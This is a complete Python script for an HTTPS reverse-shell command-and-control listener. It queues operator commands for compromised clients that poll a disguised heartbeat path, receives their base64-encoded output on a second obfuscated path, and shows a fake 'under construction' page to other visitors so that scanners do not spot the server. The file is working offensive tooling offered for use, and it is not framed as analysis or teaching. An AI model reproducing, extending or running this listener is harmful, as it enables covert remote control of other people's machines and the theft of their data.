#!/usr/bin/env python3
# Start this locally to receive the reverse shell
# Preferably on port 443, i.e. use sudo/root
# U+0A75
import argparse
import socket
import ssl
from queue import Queue, Empty
import threading
import json
import sys
import base64

# handle command line arguments
argument_parser = argparse.ArgumentParser(description='HTTPS Reverse Shell Listener')
argument_parser.add_argument("-p", "--port", help='Listening port', default=8443, type=int, required=False)
argument_parser.add_argument("-k", "--key", help='RSA Private Key location', default="server.key", type=str, required=False)
argument_parser.add_argument("-c", "--cert", help='Certificate location', default="server.crt", type=str, required=False)
args = vars(argument_parser.parse_args())

HOST = "0.0.0.0"
PORT = args['port'] # 443
CERT = args['cert'] # "server.crt"
KEY = args['key'] # "server.key"

# Paths used by the client for C&C
# ToDo: change these automatically?
# Might use the same path for both actually
path_heartbeat = "/YXNmYXNkZnNk"
path_command_response = "/dmJ2YnZiZGZh"

connection_timeout = 20 # seconds
io_response_timeout = 10 # seconds

# Create SSL/TLS context which we use to wrap all incoming connections
context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
context.load_cert_chain(certfile=CERT, keyfile=KEY)
context.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3 | ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1  # Force TLS 1.2 or newer
context.set_ciphers('EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH')

# Queues for thread interaction
command_queue = Queue() # command queue
output_queue = Queue() # output queue
interrupted = False
#active_clients = set()

# dequeue element
# Returns element or <None>, if there is no element (no blocking)
# If you supply a timeout then it will wait for an element until the time runs out (block till timeout) and then return <None>
def deq(qu, timeout=None):
    try:
        if(timeout): # seconds
            return qu.get(True, timeout)
        return qu.get(False)
    except Empty:
        return None

# hack together a simple HTTP response
# expects all input to be regular utf-8 strings
def build_response(headers, payload, response_type="200 OK"):
    res = "HTTP/1.1 {}\r\n".format(response_type)
    if len(payload):
        headers["Content-Length"] = len(payload)
    for key in headers:
        res += str(key) + ": " + str(headers[key]) + "\r\n"
    res += "\r\n"
    res += payload
    return res.encode("utf-8")

# HTTP request
# Don't bother with meticulous exception handling, if the input is malformed, then just hit them with the old 400
class Request:
    def __init__(self, received):
        # split head section and body section
        head_and_body = received.split(b"\r\n\r\n", 1)
        self.HEAD = head_and_body[0] 
        self.BODY = head_and_body[1] # allow this to throw an exception if there is no \r\n\r\n

        # Split request line and headers
        request_and_headers = self.HEAD.split(b"\r\n", 1)
        request_line = request_and_headers[0]
        header_lines = request_and_headers[1] if len(request_and_headers) > 1 else b"" # can be empty

        self.METHOD, self.PATH, self.PROTOCOL = self.parse_request_line(request_line)
        self.HEADERS = self.parse_headers(header_lines)

    def parse_request_line(self, line_bytes):
        return line_bytes.decode("utf-8").split(" ")

    def parse_headers(self, header_bytes):
        headers = {}
        header_str = header_bytes.decode("utf-8")
        
        for line in header_str.splitlines():
            key_and_value = line.split(":", 1)
            
            if len(key_and_value) < 2:
                continue # ignore invalid headers
            
            key, value = key_and_value
            headers[key.lower()] = value.strip()
        
        return headers

# Interact with client
def handle_client(conn, source):
    try:
        received = conn.recv() # receive first chunk of data
        req = Request(received)
        
        # Acquire potentially missing HTTP content from socket
        # Look for Content-Length header
        content_length_value = req.HEADERS.get("content-length")
        if content_length_value:
            content_length = int(content_length_value)
            while len(req.BODY) < content_length:
                chunk = conn.recv()
                if not chunk:
                    print("[!] Received data != Content-Length")
                    break
                req.BODY += chunk

        # Client asks for commands
        if req.METHOD == "GET" and req.PATH.startswith(path_heartbeat):
            command = deq(command_queue) # get command from queue or <None>

            response_headers = {
                "Content-Type": "application/json",
                "Connection": "Closed"
            }

            # Pack as json. <None> gets turned into <null> automatically
            response_payload = { "com" : command } 
            response_body = json.dumps(response_payload)
            conn.write(build_response(headers=response_headers, payload=response_body))
            conn.close()
            return

        # Client returns command response
        if req.METHOD == "POST" and req.PATH.startswith(path_command_response):
            output_queue.put(req.BODY) # hand over command output to I/O loop

            # respond whatever
            response_headers = {
                "Content-Type": "text/plain; charset=utf-8",
                "Connection": "Closed"
            }
            response_payload = "Sasquatch"
            conn.write(build_response(headers=response_headers, payload=response_payload))
            conn.close()
            return

        # fob off unwanted guests
        conn.write(build_response(headers={"Content-Type": "text/plain; charset=utf-8", "Connection": "Closed"}, payload="This page is under construction."))
        conn.close()

    except Exception as e:
        print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
        print(e)
        if conn:
            conn.write(build_response(headers={"Connection": "Closed"}, payload="", response_type="400 Bad Request"))
            conn.close()

# Network Loop
def listening_loop(sock):
    while not interrupted:
        conn = None
        try:
            incoming_socket, incoming_addr = sock.accept()
            conn = context.wrap_socket(incoming_socket, server_side=True)
            conn.settimeout(connection_timeout)
            handle_client(conn, incoming_addr)
        except ssl.SSLError as e:
            print(e)
        except:
            print("[!] Unusual socket behavior detected. Are you getting scanned?")
        finally:
            if conn:
                conn.close()

# Horrible way of doing this, but I don't want to use a library, requirements are for chumps
# ToDo: figure out proper way
def figure_out_charset(input_bytes):
    encodings = ["utf-8", "ascii", "latin_1", "cp1251", "cp1252", "cp1250", "cp424", "cp437", "big5", "big5hkscs", "shift_jis"]
    for enc in encodings:
        try:
            output = input_bytes.decode(enc)
            #print("Detected: " + enc)
            return output
        except:
            pass
    return input_bytes # just return bytes string if nothing fits the input

# Decide what and how to display command response/error
def display_response(response):
    res_json = json.loads(response)
    if(res_json.get("output")):
        dec = base64.b64decode(res_json.get("output"))
        print(figure_out_charset(dec))

    if(res_json.get("error")):
        dec = base64.b64decode(res_json.get("error"))
        print("Error:", figure_out_charset(dec))

# Create general purpose socket for accepting incomming connections
server_sock = socket.socket()
server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_sock.bind((HOST, PORT))
server_sock.listen(5)

# Start network loop as daemon thread
server_thread = threading.Thread(target=listening_loop, args=(server_sock,))
server_thread.setDaemon(True)
server_thread.start()
print("[*] Listening on port {}...".format(PORT))

# I/O Loop
try: 
    while not interrupted:
        user_input = input("> ")

        # Print any possible leftovers
        # ToDo: think of a better way to do this
        while old_msg := deq(output_queue):
            print("[*] Old message:")
            display_response(old_msg)

        # skip empty commands (pressing enter)
        if not user_input:
            continue

        # Hand over command to the network loop
        command_queue.put(user_input)

        # wait a bit for a response before prompting again
        response = deq(output_queue, io_response_timeout)
        if response:
            display_response(response)
        else:
            print("[!] Response took too long...")

except KeyboardInterrupt:
    print("\r\nShutting down...")
    interrupted = True
    sys.exit()